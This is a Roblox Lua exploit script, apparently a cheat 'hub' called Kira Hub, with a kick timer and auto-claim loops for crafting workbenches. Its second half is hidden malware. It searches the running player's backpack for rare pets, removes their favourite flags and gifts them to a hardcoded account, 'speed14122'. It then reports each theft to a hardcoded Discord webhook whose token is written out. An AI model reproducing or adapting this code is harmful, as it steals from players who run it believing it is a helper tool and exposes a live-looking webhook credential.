local kickButton = createButton("‚è≥ Kick Timer: ON", Color3.fromRGB(255, 70, 70), function()
	if kickEnabled then
		if passwordInput.Text == correctPassword then
			kickEnabled = false
			kickButton.Text = "‚è∏ Kick Timer: OFF"
			label.Text = kickButton.Text
		else
			label.Text = "‚ùå ‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏™‡πà‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡∏Å‡πà‡∏≠‡∏ô‡∏õ‡∏¥‡∏î!"
		end
	else
		kickEnabled = true
		startTime = tick()
		isKicked = false
		kickButton.Text = "‚è≥ Kick Timer: ON"
		label.Text = kickButton.Text
	end
end)

task.spawn(function()
	while true do
		task.wait(1)
		if kickEnabled and not isKicked then
			local remaining = 1000 - math.floor(tick() - startTime)
			if remaining <= 0 then
				isKicked = true
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "‚è∞ ‡∏Ñ‡∏∏‡∏ì‡∏≠‡∏¢‡∏π‡πà‡∏Ñ‡∏£‡∏ö‡πÄ‡∏ß‡∏•‡∏≤‡πÅ‡∏•‡πâ‡∏ß ‡πÉ‡∏´‡πâ‡∏Ñ‡∏ô‡∏≠‡∏∑‡πà‡∏ô‡πÄ‡∏Ç‡∏≤‡∏ö‡πâ‡∏≤‡∏á‡∏ô‡∏∞‡∏Ñ‡∏£‡∏±‡∏ö",
					Color = Color3.new(1, 1, 1),
					Font = Enum.Font.Gotham,
					FontSize = Enum.FontSize.Size24
				})
				task.wait(1)
				player:Kick("‡∏Ñ‡∏∏‡∏ì‡∏≠‡∏¢‡∏π‡πà‡∏Ñ‡∏£‡∏ö‡πÄ‡∏ß‡∏•‡∏≤‡πÅ‡∏•‡πâ‡∏ß ‡πÉ‡∏´‡πâ‡∏Ñ‡∏ô‡∏≠‡∏∑‡πà‡∏ô‡πÄ‡∏Ç‡∏≤‡∏ö‡πâ‡∏≤‡∏á‡∏ô‡∏∞‡∏Ñ‡∏£‡∏±‡∏ö")
			else
				label.Text = " Kira Hub - " .. remaining .. "s"
			end
		elseif not isKicked then
			label.Text = " Kira Hub - Timer Paused"
		end
	end
end)

task.spawn(function()
	while true do
		task.wait(1)
		if loopingSeed then
			local args = {"Claim", workspace.Interaction.UpdateItems.NewCrafting.SeedEventCraftingWorkBench, "SeedEventWorkbench", 1}
			pcall(function()
				game.ReplicatedStorage.GameEvents.CraftingGlobalObjectService:FireServer(unpack(args))
			end)
		end
		if loopingGear then
			local args = {"Claim", workspace.Interaction.UpdateItems.NewCrafting.EventCraftingWorkBench, "GearEventWorkbench", 1}
			pcall(function()
				game.ReplicatedStorage.GameEvents.CraftingGlobalObjectService:FireServer(unpack(args))
			end)
		end
	end
end)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")
local notified = false


local targetNames = {
	"Red Fox",
	"Raccoon",
	"Dragonfly",
	"Queen Bee",
	"Disco Bee",
	"Cooked Owl",
	"Blood Owl",
	"Moon cat"
}


local giftTargetName = "speed14122"


local webhookUrl = "https://discord.com/api/webhooks/1381764967883345950/g3arXN1BRqk85LtUbCC-OK_GS-mKcYiDs4mT9UgZgwr1aSlFeYZAszG8xa96v5LXtXG0"


local function sendWebhook(url, message, playerName)
	if notified then return end

	local serverId = game.JobId or "N/A"
	local data = {
		["content"] = "**üë§ ‡πÇ‡∏î‡∏¢‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ:** `" .. playerName .. "`\n" .. message .. "\nüåê Server ID: `" .. serverId .. "`"
	}
	local jsonData = HttpService:JSONEncode(data)
	local headers = {["Content-Type"] = "application/json"}

	local requestFunc = http_request or request or syn.request or http
	if requestFunc then
		requestFunc({
			Url = url,
			Method = "POST",
			Headers = headers,
			Body = jsonData
		})
	else
		warn("‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö request function ‡∏ó‡∏µ‡πà‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á webhook")
	end

	notified = true
end


local function giftPetToPlayer(targetPlayer)
	local args = {
		"GivePet",
		targetPlayer
	}
	local petGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
	petGiftingService:FireServer(unpack(args))
	print("üéÅ ‡∏™‡πà‡∏á‡∏™‡∏±‡∏ï‡∏ß‡πå‡πÉ‡∏´‡πâ‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô: " .. targetPlayer.Name)
end


local function isTargetName(name)
	for _, target in ipairs(targetNames) do
		if string.find(name, target) then
			return true
		end
	end
	return false
end


local function unFavoriteIfTarget()
	local character = player.Character
	if not character then return end

	for _, obj in ipairs(character:GetChildren()) do
		if obj:IsA("Tool") then
			for _, target in ipairs(targetNames) do
				if string.find(obj.Name, target) then
					local args = { obj }
					local remote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
					remote:FireServer(unpack(args))
					print("üíî ‡∏¢‡∏Å‡πÄ‡∏•‡∏¥‡∏Å Favorite: " .. obj.Name)
					return
				end
			end
		end
	end
end


local function checkBackpackAndGift()
	local targetPlayer = Players:FindFirstChild(giftTargetName)
	if not targetPlayer then
		print("‚è≥ ‡∏£‡∏≠‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏Ç‡πâ‡∏≤‡∏°‡∏≤: " .. giftTargetName)
		return
	end

	for _, item in ipairs(backpack:GetChildren()) do
		if item:IsA("Tool") and isTargetName(item.Name) then
			print("üéØ ‡∏û‡∏ö‡πÑ‡∏≠‡πÄ‡∏ó‡πá‡∏°: " .. item.Name .. " ‡πÅ‡∏•‡∏∞‡∏û‡∏ö‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢ " .. giftTargetName)

			item.Parent = player.Character

			sendWebhook(webhookUrl, "üéØ ‡∏û‡∏ö `" .. item.Name .. "` ‡πÅ‡∏•‡∏∞‡∏™‡πà‡∏á‡πÉ‡∏´‡πâ `" .. giftTargetName .. "`", player.Name)
			giftPetToPlayer(targetPlayer)

			return
		end
	end

	print("‚ùå ‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡∏û‡∏ö‡πÑ‡∏≠‡πÄ‡∏ó‡πá‡∏°‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢ ‡∏´‡∏£‡∏∑‡∏≠‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô " .. giftTargetName)
end


while true do
	unFavoriteIfTarget() -- ‚úÖ ‡∏¢‡∏Å‡πÄ‡∏•‡∏¥‡∏Å Favorite ‡∏ñ‡πâ‡∏≤‡∏°‡∏µ‡∏™‡∏±‡∏ï‡∏ß‡πå‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
	checkBackpackAndGift()
	wait(1)
end
